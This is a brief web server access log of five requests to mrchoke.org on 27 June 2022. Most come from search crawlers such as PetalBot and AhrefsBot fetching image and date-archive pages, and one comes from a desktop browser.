114.119.147.86 - - [27/Jun/2022:15:27:22 +0000] "GET /img_6998 HTTP/1.1" 301 178 "https://mrchoke.org/node/1298?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.7.214.104 - - [27/Jun/2022:15:27:23 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.147.86 - - [27/Jun/2022:15:27:29 +0000] "GET /img_6998/ HTTP/1.1" 200 7889 "https://mrchoke.org/node/1298?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.20 - - [27/Jun/2022:15:29:16 +0000] "GET /node/date/2010/04/ HTTP/2.0" 200 13642 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.73 - - [27/Jun/2022:15:30:59 +0000] "GET /node/date/2010 HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2010/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
